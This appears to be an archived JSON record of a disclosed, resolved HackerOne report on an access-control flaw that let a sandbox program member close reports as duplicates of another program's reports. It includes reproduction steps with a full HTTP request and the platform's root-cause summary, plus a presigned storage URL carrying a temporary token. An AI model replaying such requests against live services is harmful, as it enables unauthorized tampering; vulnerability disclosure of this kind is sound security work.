@@ -1,0 +1,251 @@
+{
+  "id": 2516250,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTE2MjUw",
+  "url": "https://hackerone.com/reports/2516250",
+  "title": "Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2024-05-22T19:54:27.289Z",
+  "submitted_at": "2024-05-22T19:54:28.869Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "akashhamal0x01",
+    "url": "/akashhamal0x01",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vdyDQhCg37orFjBs8DU9T7Lf/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": true,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-06-17T17:23:20.404Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-06-17T17:23:20.205Z",
+  "team_member_agreed_on_going_public_at": "2024-06-17T17:08:05.035Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nHi there, I hope you are doing well :)\n\nI found a vulnerability  which allows me to close  a report as duplicate  of another program report. This can cause problems in various ways, i will include some of them and rest needs to be verified on Hackerone side what additional impact it can cause and its root cause analysis.\n\n\n### Steps To Reproduce\n\n1.  Create a Sandbox program\n2.  Invite a user with Report and Engagement access\n3. Accept invitation from User B and login\n4. Check any report and select option to Close Report as duplicate and this will be the HTTP request:\n\n```HTTP\n\nPOST /reports/bulk HTTP/2\nHost: hackerone.com\nCookie: <USER B Cookies>\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://hackerone.com/reports/2424755\nX-Csrf-Token: <USER B CSRF TOKEN>\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nX-Datadog-Origin: rum\nX-Datadog-Parent-Id: 2173163794632761452\nX-Datadog-Sampling-Priority: 1\nX-Datadog-Trace-Id: 3844362884923386826\nContent-Length: 289\nOrigin: https://hackerone.com\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nmessage=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<your report ID>&bounty_currency=USD\n\n```\n\nHere, Only replace the values which are enclosed inside <> and then forward the request. Notice that the response is 200 OK and the report is closed as duplicate of  █████ which is publicly disclosed report of Hackerone  program\n\n## Impact\n\nThere were many scenarios in my mind regarding impact but these are most relevant ones:\n\n It can impact Automation Pipelines because there can be many reports and the program can mistakenly enter other report ID . \n\nThis one is just assumption but i believe its possible:\n\nWhen you close a report as duplicate of other report (Original report), it will show  on right side panel the reports which are duplicate of that particular report like this:\n\n{F3291232}\n\nSo my assumption is that , it might show like this to the program team  in a genuine publicly disclosed report as the attacker can dupe his/her report to public report and the public report will be shown like that to the program manager or the viewers (participants or collaborators)  which alternatively means it gives ability for any attacker to make other public reports look like they have duplicates but the duplicates are other reports from other program\n\n\nRemaining impact, root cause and potential impacts are to be evaluated by h1 team as i am limited by my sandbox program and its privilege.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 3291232,
+      "file_name": "Screenshot_2024-05-23_at_3.36.41_AM.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/72r73p7544ih873m97aofm2aj4sf?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2024-05-23_at_3.36.41_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2024-05-23_at_3.36.41_AM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7CHC37ST%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T044233Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIH2IRHH4nfuCVcEOIZx%2B6%2Br3sBoe9WkbUBattYQpMsCbAiEA%2Bfpl9E33ny207izL1kCLnkpyzqIWjHRFv2vNyc4jrxwqsgUIBRADGgwwMTM2MTkyNzQ4NDkiDB%2BW7dvcDvgy8m4XFiqPBbDmUuLbs4m7XlrceNwPyWP1pFMCX%2BUXvaZAb7pq1u18B21LOIG6jbbGChmk6wSs5zRABv2NKB8wUCga1vT2wiGTHFO%2FznMrKkSdyZ5jeaHicC3VRfpLDUdMJ0tqpEb4Nam4pRHEs5ShxvQtMTSJIdaD5oZxuij3%2BK3Tsc85Nl98dQY9PhP1vIWKXYaeqnKehpqGzYUSKQjPXJNfVEWxKNY4%2BfxyuVLl73rDn6s8w%2F1tM1JwNSmnE31apGa9mCl%2B3kBh%2FxGeQVP5AaUtTEXfj6g9dc1vzod4WZSICZCPcFaacdO6qi1miDso2XA8TjUlFvFQhm9Q4i2yYQteUhAKh5zSXBJYirHdE9neYLNDWdDLRw7IEPmTek0%2BdxcEi07QG7aoPem4E%2B5GyQsiNwjJanq4Aa%2FEIZDFkYzR4QrpiPntfF1R1Uz4sa0Ig0P1w5tD92j97%2FbwzYxYwfgaJATgvaVYW4Bd6zTKg5cZi8bzXVIlFBGzGzlVFFZNSyaEyvQeblzLoZ%2BX5L%2BwC4IPwAp3hX9HvD5bOK6OFSgfCoXysRgu6UPYYmDnge0JyHnNnDlamTyLwpGWHuQZoC3mAPubux5ZUVBJr%2FAHWLg9%2Fg%2Bjv3b5utoqhXWJa3LbRdifTeV4rzwXJjNalU2N6XpOt3dATTUqA%2FFn2K94k0WPFgWWt69z6cFEnwXnr5Q5Ewpbtt%2BZjPyvjRtUJa87qc%2BvmkN2mwjpgFNG3j6F0FDFC%2BngiLDsZTOCBMn5ECMPMDmxhc2gMx4Z%2BMPCbO8A2WvlrPobQsVe9f6VJkCxXZDS63YwZyNjAvbrMnQqeuwIdNGn2NSiemMhdu40WNmi9d8uugVgCWOCxujFoPh8lHQGqe861oEwl%2Bic0gY6sQGRbYbqE1lORhnf68FLy%2F5XRtM8FvhrYdo%2BIVFe4ydA4r%2B7JkiJ0w1vUQlQ1NRNy%2Bcpq6cQUOHsd%2FLzoo2FJKrcSq%2BNdUpkasD5ci1WG0GaTHoaNP6Gr30%2FIwnWcWYWsPeO7DUcbqGHiNOybA25zqzalc9LVTTi8KgJkg0LbjdCmy4nnrDm3dqIB%2BAIqIxNlSTcgSvFU2qZpATg646KLXGpI72yDx7Az%2Fs6nUQHONcXwOY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ac382592b93af7777603d91d106ce0e3b8e63241cd7efd908bae7b2c90fc5b7",
+      "file_size": 407019,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2024-07-17T17:08:05.380Z",
+  "allow_singular_disclosure_after": -61817667.70108604,
+  "singular_disclosure_allowed": true,
+  "vote_count": 104,
+  "voters": [
+    "m4khn0",
+    "defenderwww",
+    "orange303",
+    "ninjeeter",
+    "0xtarun",
+    "supermancyber",
+    "n1m0",
+    "ganeshbagaria",
+    "maskopatol",
+    "drsniper",
+    "and 94 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 462356,
+      "category": "team",
+      "content": "**Summary**\nA vulnerability has been discovered that allows an unauthorized user to close a report on the HackerOne platform as a duplicate of another report from a different program or organization. This improper access control issue enables potential misuse and disruption of the reporting process.\n\n**RCA**\nWe relied on an ACL check `can?(:view, original_report)` that the report was visible to the team member closing the report as a duplicate, but we didn’t take into account limited disclosed reports also return true on this ACL check or that the original report was in the same organization.\n\nOur forensic investigation confirmed that only the report mentioned in this report was affected. The customer is notified about this. ",
+      "updated_at": "2024-06-17T17:11:58.444Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2300656,
+        "username": "z0x01",
+        "name": "z0x01",
+        "bio": "Working  @Hacker0x01  || Passionated about Security",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2022-04-04T10:20:02.850Z",
+        "url": "https://hackerone.com/z0x01",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/gcpf9xwpjnj668fd94ar3jnxsknf/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gcpf9xwpjnj668fd94ar3jnxsknf/8f5393bb06e000811ac3ac31f77f5ce1d049785766c3d25a25cec97adaa9cc12",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/gcpf9xwpjnj668fd94ar3jnxsknf/eab7e558a2bc3ec841c51b96524419e712978d371ddb665048a3154ab05197fc"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "2516250",
+  "votes": 104,
+  "latest_disclosable_activity_at": "2024-06-17T17:23:20.699Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:42:33.303677",
+    "source": "https://hackerone.com/reports/2516250.json",
+    "report_id": 2516250
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTE2MjUw",
+    "databaseId": "2516250",
+    "title": "Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports",
+    "url": "https://hackerone.com/reports/2516250",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2024-06-17T17:23:20.404Z",
+    "created_at": "2024-05-22T19:54:27.289Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI2",
+      "name": "Improper Access Control - Generic",
+      "external_id": "cwe-284"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 8.2
+    },
+    "reporter": {
+      "username": "akashhamal0x01"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81ODE4OTU=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2024-05-29T01:38:51.852Z"
+          }
+        },
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81ODE4OTY=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2024-05-29T01:38:52.029Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI1MTYyNTA=",
+    "_id": "2516250",
+    "disclosed": true,
+    "votes": 104,
+    "latest_disclosable_activity_at": "2024-06-17T17:23:20.699Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTE2MjUw",
+      "databaseId": "2516250",
+      "title": "Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports",
+      "url": "https://hackerone.com/reports/2516250",
+      "disclosed_at": "2024-06-17T17:23:20.404Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    }
+  }
+}
